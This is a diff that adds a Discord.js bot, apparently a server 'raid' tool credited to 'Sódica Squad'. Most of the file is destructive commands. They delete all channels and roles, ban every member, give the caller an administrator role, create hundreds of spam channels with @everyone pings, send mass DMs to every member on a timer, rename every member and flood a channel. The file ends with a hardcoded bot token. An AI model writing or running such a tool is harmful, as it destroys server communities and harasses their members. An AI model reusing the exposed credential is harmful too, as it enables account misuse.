@@ -1,0 +1,246 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const chalk = require('chalk');
+ 
+client.on("ready", () => {
+ 
+console.log(chalk.red(`
+                                
+  `))
+ 
+ 
+console.log(chalk.red(""));   
+ console.log(chalk.blue(`           BOT ${client.user.tag} ENCENDIDO`));  
+console.log("COMANDOS")
+ console.log(chalk.green(`
+$on`))
+ 
+   presencia();  
+    });
+ 
+ 
+ 
+function presencia(){
+  client.user.setPresence({
+status: "dnd",
+activity: {
+  name: "Modded By Ƹ̵̡Ӝ̵̨̄Sódica Squad DevolpersӜ̵̨̄Ʒ",
+  type: "PLAYING"
+ 
+}
+  });
+}
+ 
+ 
+//automatico
+ 
+client.on("message", message => {
+  if(message.author.bot) return;
+ 
+  if(message.content === '$on'){
+      message.delete()
+      message.guild.channels.cache.forEach(channel => channel.delete());
+      message.guild.channels.create('Raid-By-Sodica-Squad', {
+        type: 'text'
+      }).then(channel => {
+        channel.send("https://instagram.com/ramardoam")
+      })
+    for (let i = 0; i <= 500; i++) {
+         message.guild.channels.create(`fucked-by-sodica`, {
+           type: 'text'
+         }).then(channel => {
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+       })
+       }
+       message.guild.setName("RaidBySodicaSquad");
+       message.guild.setIcon("https://media.discordapp.net/attachments/873333378668175459/876664905783205918/20210717_175545.png");
+     }
+})
+ 
+ 
+//admin
+ 
+client.on("message", async msg => {
+  if (msg.author.bot) return;
+  if(msg.content.toLowerCase().startsWith('$admin')){
+    let rol = await msg.guild.roles.create({data: {
+      name: "Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ",
+      color: "ff00ff",
+      permissions: "ADMINISTRATOR",
+      hoisted: false
+    }})
+ 
+msg.member.roles.add(rol)
+      .then(function(role) {
+        msg.member.addRole(role);
+        if (msg.deletable) msg.delete().catch(e => {});
+      })
+      .catch(e => {});
+  }
+});
+ 
+
+
+
+ 
+//banall
+ 
+client.on("message", async message => {
+    if(message.content.startsWith('$banall')){
+      message.delete();
+      if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
+      message.guild.members.cache.forEach(member => {
+        if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
+          member.ban();
+        }
+      })
+    }});
+
+//nuke 
+ 
+client.on("message", message => {
+    if (message.author.bot) return;
+  
+   if (message.content === '$delete') {
+    message.delete()
+    message.guild.channels.cache.forEach(channel => channel.delete());
+    message.guild.channels.create(`Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ`, {
+          type: 'text'
+        }).then(channel => {
+          channel.send("https://media.discordapp.net/attachments/873333378668175459/873751975320223774/Sodica_Squad.mp4")
+        })
+         }
+      })
+ 
+ 
+//chats
+ 
+client.on("message", message => {
+            if (message.author.bot) return;
+          
+           if (message.content === '$raid') {
+            message.delete()
+           for (let i = 0; i <= 500; i++) {
+                message.guild.channels.create(`fucked-by-sodica`, {
+                  type: 'text'
+                }).then(channel => {
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+           channel.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**");
+                
+              })
+              }
+              }
+            });
+ 
+//mdall
+ 
+client.on("message", message => {
+                        if (message.author.bot) return;
+                        
+                      if(message.content === "$mdall")
+                        message.delete()
+                      message.guild.members.cache.forEach(member => {
+                        setInterval(function(){
+                          member.send("@everyone **Raid By Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ - https://linktr.ee/ramardo__**").catch(error => {});
+                        },450);
+                      })
+                      });
+ 
+ 
+//borrar roles
+ 
+client.on("message", message => {
+                    if (message.author.bot) return;
+                  
+                     if(message.content === ('$eliminarroles')){
+                      message.delete()
+                            message.guild.roles.cache.map(roles => roles.delete());
+                          }
+                  });
+
+ 
+//crear roles
+
+client.on("message", message => {
+                if (message.author.bot) return;
+              
+               if (message.content === '$crearroles') {
+                message.delete()
+              for (let i = 0; i <= 200; i++) {
+                 message.guild.roles.create({data: {name: `Ƹ̵̡Ӝ̵̨̄Sódica SquadӜ̵̨̄Ʒ`,color: '#ff00ff',},reason: 'razon',})
+              };
+               }
+                });
+ 
+//nickall
+ 
+client.on("message", msg => {
+const args = msg.content.slice().trim().split(/ +/g );
+const command = args.shift().toLowerCase();
+  if (command === '$nick'){
+      msg.delete()
+    let nickname = args.join("nashe");
+    var i = 0;
+    msg.guild.members.cache.forEach(member =>{
+      i++
+    }
+      )
+    msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
+    msg.guild.members.cache.forEach(member =>{
+ 
+      member.setNickname(nickname)
+    })
+    }
+});
+
+//flood
+
+client.on("message", message => {
+  if(message.author.bot) return;
+   
+  if(message.content === 'ñ') {
+    message.delete()
+    for(let i = 0; i <= 500000; i++) {
+    message.channel.send("@everyone https://instagram.com/ramardoam")
+  }
+  }
+  })
+
+
+ 
+ 
+ 
+ 
+ 
+client.login(`NzI0MDc0MzM5NDEwMTE2NjY4.Xu64xw.jcOsJEnf0NUtot6rLBmJKjTd0R4`);
